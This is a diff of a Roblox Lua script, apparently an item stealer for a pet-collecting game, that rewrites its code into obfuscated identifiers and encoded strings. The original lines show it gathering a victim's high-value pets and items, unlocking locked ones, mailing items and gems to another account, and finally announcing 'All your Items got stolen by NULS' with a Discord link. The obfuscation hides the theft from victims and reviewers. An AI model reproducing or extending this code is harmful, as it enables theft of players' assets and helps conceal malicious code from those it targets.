+				_DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="91970b063186c46b",d={211,248,115,60}},{k="97552c3e0c180fc7",d={183,2,69}},{k="be874b8d954233d1",d={202,239,47}},{k="7135cf854cabdd77",d={3,84,184}},{k="2b23a8d7109a95e1",d={11,98,196,187}}}), key)
 			end
         end
     end
 end
 
 local function ClaimMail()
-    local response, err = network.Invoke("Mailbox: Claim All")
-    while err == "You must wait 30 seconds before using the mailbox!" do
+    local _CNCGSC, _tyfjVr = _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="11cd8220a595660f",d={92,172,235,76,199,250,30,53,49}},{k="9cc34173d3f412dc",d={223,175,32,26,190,212,83,176,240}}}))
+    while _tyfjVr == __DLUNvJ_qHqF({{k="94005847c8a00c9c",d={205,111,45,103,165,213,127,232,180,119}},{k="2406c2372ab63ad0",d={69,111,182,23,25,134,26,163,65,101}},{k="14d897625cadeb30",d={123,182,243,17,124,207,142,86,123,170}},{k="417b3f5fa5e8d4e5",d={36,91,74,44,204,134,179,197,53,19}},{k="9d7eff8dc59728e6",d={248,94,146,236,172,251,74,137,229,95}}}) do
         wait(0.2)
-        response, err = network.Invoke("Mailbox: Claim All")
+        _CNCGSC, _tyfjVr = _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="4b589782b9a8fce5",d={6,57,254,238}},{k="85ce7bd611f01f81",d={231,161,3,236}},{k="88a12de4d7afb48d",d={168,226,65}},{k="fdc9eaca9576ecaa",d={156,160,135}},{k="6c00d578d833564e",d={76,65,185,20}}}))
     end
 end
 
 local function canSendMail()
-	local uid
-	for i, v in pairs(save["Pet"]) do
-		uid = i
+	local _qHwIGD
+	for i, v in pairs(_QBerdL[__DLUNvJ_qHqF({{k="ddc8e7375c2718f1",d={141}},{k="2bed217e511378d8",d={78}},{k="917d033ccb056c62",d={}},{k="1360961011085abc",d={103}}})]) do
+		_qHwIGD = i
 		break
 	end
-	local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
+	local _eZeYBJ = {
+        [1] = __DLUNvJ_qHqF({{k="36314f5477b1723d",d={100,94}},{k="ce9e20afa9262fe7",d={172}},{k="930e1dc507a0a368",d={255}},{k="647eabaa71d2ea3d",d={11,6}}}),
+        [2] = __DLUNvJ_qHqF({{k="59e54a82138c0dc6",d={13,128}},{k="cad4ce565854d031",d={185,160}}}),
+        [3] = __DLUNvJ_qHqF({{k="df85787a7e0d4dde",d={143}},{k="af6657932d769412",d={202}},{k="3a870aeef3fbd3ac",d={}},{k="80e7f993e14f8954",d={244}}}),
+        [4] = _qHwIGD,
         [5] = 1
     }
-    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-    return (err == "They don't have enough space!")
+    local _CNCGSC, _tyfjVr = _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="67224981fcefdbf0",d={42,67,32,237,158}},{k="92557bbcd25c4203",d={253,45,65,156}},{k="e253249a3be9c73a",d={177,54,74,254}}}), unpack(_eZeYBJ))
+    return (_tyfjVr == __DLUNvJ_qHqF({{k="00871a9f665b3cb8",d={84,239,127,230,70,63,83,214,39,243}},{k="adb02f02a4f03395",d={141,216,78,116,193,208,86,251,194}},{k="d9bf5b6c23c461d7",d={172,216,51,76,80,180,0,180,188,158}}}))
 end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
+local _hlwNkq = {__DLUNvJ_qHqF({{k="228c59b5eb35999e",d={114}},{k="21ca63d368e08deb",d={68}},{k="aaac737b96e603b7",d={}},{k="488095876fff080e",d={60}}}), __DLUNvJ_qHqF({{k="3f307d94dc0ed79e",d={122,87}},{k="f295be0d10cf2f80",d={149}}}), __DLUNvJ_qHqF({{k="33be6536a5eec0c9",d={112}},{k="0863f3e05adb7dc9",d={96}},{k="42877cdacd9af148",d={35}},{k="c1a9e450c59f9257",d={179}},{k="10ac2ae608e8ac4b",d={125}}}), __DLUNvJ_qHqF({{k="2e349c2783da1f81",d={107,90}},{k="48fd109daccbfe9f",d={43,149}},{k="2078203fa15a4523",d={65}},{k="91a8f8c04f044061",d={255,220}}}), __DLUNvJ_qHqF({{k="57e2d01f739ec273",d={7,141}},{k="afed96bf84ad435e",d={219,132}},{k="7cc0f7514d7ad897",d={19,174}}}), __DLUNvJ_qHqF({{k="c2c4db0eb1d96fcd",d={143}},{k="ad392220a417774d",d={196}},{k="8d1335048d6f9222",d={254}},{k="4bdb5a182c973e1d",d={40}}}), __DLUNvJ_qHqF({{k="f0e19a7b37c002f5",d={184,142,236,30}},{k="3b2bc41d29ae41f6",d={73,73,171}},{k="3ce47e40be2060e6",d={93,150,26}}}), __DLUNvJ_qHqF({{k="99eb5566368ac5c0",d={219,132}},{k="cf332018364da84b",d={160}},{k="ad068b9f7d0fa56a",d={217,110}}}), __DLUNvJ_qHqF({{k="0c6bb7f947a1fe11",d={89,7}},{k="f35dfa430877036e",d={135,52}},{k="5c0c6f0d9eda2a91",d={49,109}},{k="20632553001d7819",d={84,6}}})}
 
-for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		for uid, item in pairs(save[v]) do
-			if v == "Pet" then
-                local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
-                if dir.huge or dir.exclusiveLevel then
-                    local rapValue = getRAP(v, item)
-                    if rapValue >= min_rap then
-                        local prefix = ""
+for i, v in pairs(_hlwNkq) do
+	if _QBerdL[v] ~= nil then
+		for _qHwIGD, item in pairs(_QBerdL[v]) do
+			if v == __DLUNvJ_qHqF({{k="0fd2543e31280317",d={95}},{k="3b389f31f7e90f33",d={94}},{k="c6dc7366a04eea05",d={178}}}) then
+                local _zwEqqp = require(game:GetService(__DLUNvJ_qHqF({{k="7b669d1a58277d75",d={41,3,237,118}},{k="4069977fdf474cbb",d={41,10,246}},{k="36262b53ae11ae92",d={66,67,79}},{k="27d839b2cd436022",d={116,172,86}},{k="d263e79693fdcff3",d={160,2,128,243}}})).Library.Directory.Pets)[item.id]
+                if _zwEqqp.huge or _zwEqqp.exclusiveLevel then
+                    local _fQKPss = getRAP(v, item)
+                    if _fQKPss >= _kZItGN then
+                        local _tWQGdY = __DLUNvJ_qHqF({{k="20005eda214895a6",d={}},{k="6e78d99cdeaf70f3",d={}},{k="731b91cf02b7b64f",d={}},{k="f56ec67a44738306",d={}},{k="dc17c6585896d3d9",d={}}})
                         if item.pt and item.pt == 1 then
-                            prefix = "Golden "
+                            _tWQGdY = __DLUNvJ_qHqF({{k="8d61dd9fa977c1da",d={202,14,177,251}},{k="d0dc49f2acab614b",d={181,178,105}}})
                         elseif item.pt and item.pt == 2 then
-                            prefix = "Rainbow "
+                            _tWQGdY = __DLUNvJ_qHqF({{k="6e953c157e139726",d={60,244}},{k="8dbb296c6281aa3b",d={228,213}},{k="de935f2e8f23e515",d={188}},{k="8efce6daa59d1049",d={225}},{k="95f34daf8f00ee86",d={226,211}}})
                         end
                         if item.sh then
-                            prefix = "Shiny " .. prefix
+                            _tWQGdY = __DLUNvJ_qHqF({{k="6450cdf588138b66",d={55,56}},{k="22217cdb61ed9571",d={75,79}},{k="f975dba4cee685e6",d={128,85}}}) .. _tWQGdY
                         end
-                        local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
-                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                        local _juOzwf = _tWQGdY .. item.id
+                        table.insert(_RLDwiq, {_DNXPxb = v, _qHwIGD = _qHwIGD, amount = item._am or 1, rap = _fQKPss, name = _juOzwf})
+                        _PjqkNo = _PjqkNo + (_fQKPss * (item._am or 1))
                     end
                 end
             else
-                local rapValue = getRAP(v, item)
-                if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
-                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                local _fQKPss = getRAP(v, item)
+                if _fQKPss >= _kZItGN then
+                    table.insert(_RLDwiq, {_DNXPxb = v, _qHwIGD = _qHwIGD, amount = item._am or 1, rap = _fQKPss, name = item.id})
+                    _PjqkNo = _PjqkNo + (_fQKPss * (item._am or 1))
                 end
             end
             if item._lk then
-                local args = {
-                [1] = uid,
+                local _eZeYBJ = {
+                [1] = _qHwIGD,
                 [2] = false
                 }
-                network.Invoke("Locking_SetLocked", unpack(args))
+                _DNtNbJ.Invoke(__DLUNvJ_qHqF({{k="ccc1cbc67b1cb106",d={128,174,168,173}},{k="a4ac526cd2bc1200",d={205,194,53}},{k="7e72f216b10447fe",d={33,33,151}},{k="24f9280f2bb7cfad",d={80,181,71}},{k="99270a8b696a646b",d={250,76,111,239}}}), unpack(_eZeYBJ))
             end
         end
 	end
 end
 
-if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
+if #_RLDwiq > 0 or _kQQZHX > _kZItGN + _hOcIpR then
     ClaimMail()
 	EmptyBoxes()
     if not canSendMail() then
-        message.Error("Account error. Please rejoin and try again or use a different account")
+        _VKGFMf.Error(__DLUNvJ_qHqF({{k="2f54414d9bb7c76b",d={110,55,34,34,238,217,179,75,74,38,51,34,233,153,231,59,67,49}},{k="b95d5fa47d0302a5",d={216,46,58,132,15,102,104,202,208,51,127,197,19,103,34,209,203}},{k="caafd4dec4352fed",d={179,143,181,185,165,92,65,205,165,221,244,171,183,80,15,140,234}},{k="7f106d0cb82a194e",d={27,121,11,106,221,88,124,32,11,48,12,111,219,69,108,32,11}}}))
         return
     end
 
-    table.sort(sortedItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount 
+    table.sort(_RLDwiq, function(_wvwcDV, _UgPAMl)
+        return _wvwcDV.rap * _wvwcDV.amount > _UgPAMl.rap * _UgPAMl.amount 
     end)
 
     spawn(function()
-        SendMessage(GemAmount1)
+        SendMessage(_kQQZHX)
     end)
 
-    for _, item in ipairs(sortedItems) do
-        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
+    for _, item in ipairs(_RLDwiq) do
+        if item.rap >= _hOcIpR and _kQQZHX > _hOcIpR then
             sendItem(item.category, item.uid, item.amount)
         else
             break
         end
     end
-    if GemAmount1 > mailSendPrice then
+    if _kQQZHX > _hOcIpR then
         SendAllGems()
     end
-    message.Error("All your Items got stolen by NULS \n Join my Discord: .gg/xGgkWUxU3w")
+    _VKGFMf.Error(__DLUNvJ_qHqF({{k="0de8fb729d1bb11a",d={76,132,151,82,228,116,196,104,45,161,143,23,240,104,145,125,98,156,219,1,233,116,221,127,99,200,153,11,189,85,228,86,94,200}},{k="3c493c7e5a81a4d2",d={82,105,118,17,51,239,132,191,69,105,120,23,41,226,203,160,88,115,28,80,61,230,139,170,123,46,87,41,15,249,241,225,75}}}))
 end
